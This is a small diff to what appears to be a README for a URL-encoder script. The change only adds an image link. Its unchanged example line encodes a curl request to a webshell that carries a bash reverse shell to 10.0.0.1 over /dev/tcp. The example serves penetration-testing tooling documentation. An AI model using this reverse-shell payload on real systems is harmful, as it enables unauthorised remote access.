@@ -8,3 +8,5 @@ Ex:
 ```
 python3 url-encoder.py "curl http://root.me/webshell?cmd=bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
 ```
+
+![alt text](image.png)
